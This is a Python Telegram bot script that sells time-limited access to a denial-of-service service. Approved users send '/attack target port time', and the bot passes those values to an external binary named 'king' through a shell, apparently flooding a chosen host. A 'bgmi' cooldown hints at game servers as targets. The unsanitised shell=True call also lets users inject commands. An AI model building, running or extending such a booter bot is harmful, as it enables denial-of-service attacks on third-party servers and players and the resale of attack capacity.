#!/usr/bin/python3

import telebot
import subprocess
import datetime
import os

# INSERT NEW TOKEN FROM BOTFATHER
bot = telebot.TeleBot("PUT_NEW_TOKEN_HERE")

# Admin user IDs
admin_id = ["5213725124"]

# Files
USER_FILE = "users.txt"
LOG_FILE = "log.txt"
FREE_USER_FILE = "free_users.txt"

free_user_credits = {}

# Read allowed users
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Log command
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)

    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(
            f"Username: {username}\n"
            f"Target: {target}\n"
            f"Port: {port}\n"
            f"Time: {time}\n\n"
        )

# Record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"

    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Approval expiry tracking
user_approval_expiry = {}

def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)

    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        return "Expired" if remaining_time.days < 0 else str(remaining_time)

    return "N/A"

def set_approval_expiry_date(user_id, duration, time_unit):

    now = datetime.datetime.now()

    if time_unit.startswith("hour"):
        expiry = now + datetime.timedelta(hours=duration)
    elif time_unit.startswith("day"):
        expiry = now + datetime.timedelta(days=duration)
    elif time_unit.startswith("week"):
        expiry = now + datetime.timedelta(weeks=duration)
    elif time_unit.startswith("month"):
        expiry = now + datetime.timedelta(days=30 * duration)
    else:
        return False

    user_approval_expiry[user_id] = expiry
    return True

# ADD USER
@bot.message_handler(commands=["add"])
def add_user(message):

    user_id = str(message.chat.id)

    if user_id not in admin_id:
        bot.reply_to(message, "Only admin can add users.")
        return

    command = message.text.split()

    if len(command) < 3:
        bot.reply_to(message, "Usage: /add userid 1day")
        return

    new_user = command[1]
    duration_text = command[2]

    duration = int(duration_text[:-3])
    time_unit = duration_text[-3:]

    allowed_user_ids.append(new_user)

    with open(USER_FILE, "a") as f:
        f.write(new_user + "\n")

    set_approval_expiry_date(new_user, duration, time_unit)

    bot.reply_to(message, f"User {new_user} added successfully.")

# REMOVE USER
@bot.message_handler(commands=["remove"])
def remove_user(message):

    user_id = str(message.chat.id)

    if user_id not in admin_id:
        bot.reply_to(message, "Only admin allowed.")
        return

    command = message.text.split()

    if len(command) < 2:
        bot.reply_to(message, "Usage: /remove userid")
        return

    target_user = command[1]

    if target_user in allowed_user_ids:
        allowed_user_ids.remove(target_user)

        with open(USER_FILE, "w") as f:
            for uid in allowed_user_ids:
                f.write(uid + "\n")

        bot.reply_to(message, "User removed.")
    else:
        bot.reply_to(message, "User not found.")

# ATTACK COMMAND

bgmi_cooldown = {}
COOLDOWN_TIME = 10

@bot.message_handler(commands=["attack"])
def handle_attack(message):

    user_id = str(message.chat.id)

    if user_id not in allowed_user_ids:
        bot.reply_to(message, "Unauthorized access.")
        return

    if user_id in bgmi_cooldown:

        diff = (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds

        if diff < COOLDOWN_TIME:
            bot.reply_to(message, "Cooldown active. Wait.")
            return

    command = message.text.split()

    if len(command) != 4:
        bot.reply_to(message, "Usage: /attack target port time")
        return

    target = command[1]
    port = command[2]
    time = command[3]

    bgmi_cooldown[user_id] = datetime.datetime.now()

    record_command_logs(user_id, "/attack", target, port, time)
    log_command(user_id, target, port, time)

    bot.reply_to(message, f"Attack started on {target}")

    subprocess.run(f"./king {target} {port} {time} 100", shell=True)

# START COMMAND

@bot.message_handler(commands=["start"])
def start(message):

    bot.reply_to(
        message,
        "Welcome! Use /help to see commands."
    )

# HELP COMMAND

@bot.message_handler(commands=["help"])
def help_cmd(message):

    bot.reply_to(
        message,
        "/attack target port time\n"
        "/myinfo\n"
        "/mylogs"
    )

print("Bot running...")

bot.polling()
